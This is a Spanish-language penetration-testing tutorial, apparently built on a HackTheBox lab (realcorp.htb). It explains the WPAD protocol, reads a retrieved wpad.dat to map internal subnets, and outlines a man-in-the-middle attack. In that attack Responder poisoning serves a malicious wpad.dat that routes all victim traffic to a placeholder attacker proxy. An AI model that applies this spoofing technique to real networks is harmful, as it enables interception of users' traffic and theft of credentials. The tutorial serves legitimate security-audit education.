# **Análisis Avanzado de WPAD y el Archivo `wpad.dat`**

El protocolo WPAD y su archivo de configuración asociado, `wpad.dat`, constituyen una de las fuentes de inteligencia de red más valiosas durante una auditoría de seguridad. Comprender su funcionamiento es esencial para el reconocimiento y la posterior explotación.

## 1\. Fundamentos del Protocolo WPAD

**WPAD (Web Proxy Auto-Discovery Protocol)** es un mecanismo estándar diseñado para permitir que los clientes de una red (como los navegadores web) descubran y configuren automáticamente los ajustes del servidor proxy sin intervención manual del usuario.

El principal objetivo de WPAD es simplificar la administración de redes a gran escala. En lugar de configurar cada cliente individualmente, el administrador centraliza la lógica de conexión en un único archivo.

El proceso de descubrimiento se realiza típicamente de dos maneras:

1.  **Vía DNS (el método más común)**: El cliente intenta resolver el nombre de host `wpad` dentro de su dominio local (ej. `wpad.empresa.com`). Si tiene éxito, solicitará el archivo de configuración.
2.  **Vía DHCP**: El servidor DHCP puede informar a los clientes de la ubicación exacta del archivo de configuración durante el proceso de asignación de IP.

## 2\. El Archivo de Configuración: `wpad.dat`

El `wpad.dat` es un archivo de texto que contiene código JavaScript. Su estructura se basa en una única función obligatoria: `FindProxyForURL(url, host)`. El navegador ejecuta esta función para cada URL que el usuario solicita, y la función debe devolver una cadena de texto que indica cómo proceder.

Las directivas de retorno más comunes son:

  * **`"DIRECT"`**: Instruye al cliente para que se conecte directamente al servidor de destino, sin pasar por ningún proxy.
  * **`"PROXY proxy-servidor:puerto"`**: Instruye al cliente para que utilice el servidor proxy especificado. Es posible definir múltiples proxies para redundancia.

### Análisis Estructural del Archivo (Caso Práctico)

A continuación, se analiza el contenido del archivo `wpad.dat` obtenido del host `wpad.realcorp.htb`.

**Comando para obtener el archivo:**

```bash
proxychains4 -q curl wpad.realcorp.htb/wpad.dat
```

**Contenido del `wpad.dat`:**

```javascript
function FindProxyForURL(url, host) {
    if (dnsDomainIs(host, "realcorp.htb"))
        return "DIRECT";

    if (isInNet(dnsResolve(host), "10.197.243.0", "255.255.255.0"))
        return "DIRECT";

    if (isInNet(dnsResolve(host), "10.241.251.0", "255.255.255.0"))
        return "DIRECT";

    return "PROXY proxy.realcorp.htb:3128";
}
```

## 3\. Inteligencia Obtenida del Análisis

La simple lectura de este archivo revela información crítica sobre la topología y las políticas de la red interna.

  * **Dominio Interno Principal**: La condición `dnsDomainIs(host, "realcorp.htb")` confirma que `realcorp.htb` es el dominio interno de la organización. Cualquier host que termine en `.realcorp.htb` es considerado parte de la red local.

  * **Segmentos de Red Interna**: Las condiciones `isInNet` exponen directamente los rangos de direcciones IP que son considerados como parte de la red interna.

      * `10.197.243.0/24`
      * `10.241.251.0/24`
        Esta información es de un valor incalculable, ya que permite dirigir los escaneos de red y los ataques de movimiento lateral a los segmentos correctos.

  * **Política de Enrutamiento de Tráfico**: La lógica del script define claramente la política de navegación de la empresa:

      * **Tráfico Interno**: Toda comunicación destinada a recursos dentro del dominio `realcorp.htb` o en las subredes identificadas se realiza de forma directa.
      * **Tráfico Externo (Internet)**: Cualquier otra petición, por defecto, debe ser enrutada a través del servidor proxy `proxy.realcorp.htb` en el puerto `3128`.

## 4\. Utilización de `wpad.dat` en un Pentest

### **Fase 1: Reconocimiento Pasivo**

Como se ha demostrado, analizar el `wpad.dat` es una técnica de reconocimiento pasivo de alto impacto. Permite construir un mapa preliminar de la red objetivo sin enviar un solo paquete a los rangos de IP internos.

### **Fase 2: Ataques Activos de Man-in-the-Middle (MitM)**

El protocolo WPAD es notoriamente vulnerable a ataques de suplantación en una red local. Si un atacante puede posicionarse en la misma red que los clientes, puede explotar el proceso de auto-descubrimiento.

1.  **Suplantar el Servidor WPAD**: Utilizando herramientas como **Responder**, un atacante puede envenenar las respuestas de los protocolos de resolución de nombres locales (LLMNR y NBT-NS). Cuando un cliente pregunte por `wpad`, el atacante responderá antes que el servidor legítimo, afirmando ser él.

2.  **Servir un `wpad.dat` Malicioso**: Una vez que el cliente se conecta al servidor del atacante, este le entrega un archivo `wpad.dat` modificado.

    ```javascript
    function FindProxyForURL(url, host) {
        // Enviar todo el tráfico al proxy del atacante
        return "PROXY <IP_ATACANTE>:8080";
    }
    ```

3.  **Interceptar y Manipular Tráfico**: Todo el tráfico web de las víctimas pasará a través del proxy del atacante. Esto le permite:

      * Capturar credenciales enviadas en texto claro (HTTP).
      * Realizar ataques de `SSL-stripping` para degradar conexiones seguras a inseguras.
      * Inyectar código malicioso en las respuestas web.

## 5\. Conclusión

El archivo `wpad.dat` es mucho más que un simple fichero de configuración. Para un pentester, es una hoja de ruta que detalla la estructura lógica y física de la red de una organización. Además, el protocolo WPAD subyacente representa un vector de ataque significativo para la intercepción de tráfico en entornos de red interna. Su análisis debe ser una prioridad en cualquier auditoría de seguridad.